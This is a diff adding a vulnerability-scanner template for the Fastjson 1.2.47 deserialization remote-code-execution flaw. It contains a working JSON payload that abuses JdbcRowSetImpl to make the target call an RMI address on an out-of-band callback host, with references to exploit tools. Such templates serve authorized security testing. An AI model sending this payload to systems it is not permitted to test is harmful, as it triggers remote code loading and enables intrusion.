@@ -1,0 +1,36 @@
+id: fastjson-1-2-47-rce
+
+info:
+  name: Fastjson 1.2.47 Deserialization RCE
+  author: zh
+  severity: critical
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce
+    - https://www.freebuf.com/vuls/208339.html
+    - https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
+    - https://github.com/wyzxxz/fastjson_rce_tool
+
+set:
+  reverse: newReverse()
+  reverseURL: reverse.url.host
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
+        {
+            "a":{
+                "@type":"java.lang.Class",
+                "val":"com.sun.rowset.JdbcRowSetImpl"
+            },
+            "b":{
+                "@type":"com.sun.rowset.JdbcRowSetImpl",
+                "dataSourceName":"rmi://{{reverseURL}}/Exploit",
+                "autoCommit":true
+            }
+        }
+    expression: response.status == 400 && reverse.wait(5)
+expression: r0() 
